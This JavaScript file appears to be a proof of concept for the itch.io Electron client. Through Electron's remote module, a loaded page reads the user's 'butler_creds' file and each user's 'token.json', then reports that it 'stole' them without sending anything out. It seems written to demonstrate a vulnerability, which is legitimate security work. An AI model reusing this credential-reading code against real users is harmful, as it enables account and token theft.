'use strict'

const {app} = require('electron').remote.require('electron')
const ospath = require('path')
const fs = require('fs')

const say = (msg) => {
  document.body.innerHTML += msg + '\n'
}

document.addEventListener('DOMContentLoaded', function () {
  const appDataPath = app.getPath('appData')
  const itchPath = ospath.join(appDataPath, 'itch')

  if (fs.existsSync(itchPath)) {
    say(`itch data path: ${itchPath}`)

    try {
      fs.readFileSync(ospath.join(itchPath, 'butler_creds'))
      say('stole butler creds')
    } catch (e) {
      say(`couldn't steal butler creds (${e})`)
    }

    const usersDir = ospath.join(itchPath, 'users')
    const users = fs.readdirSync(usersDir)
    say(`users: ${users.join(', ')}`)

    for (const user of users) {
      if (isNaN(parseInt(user, 10))) {
        continue
      }
      say(`for user ${user}:`)
      const tokenPath = ospath.join(usersDir, user, 'token.json')
      try {
        fs.readFileSync(tokenPath)
        say(`stole token`)
      } catch (e) {
        say(`could not steal token (${e})`)
      }
    }
  }
})
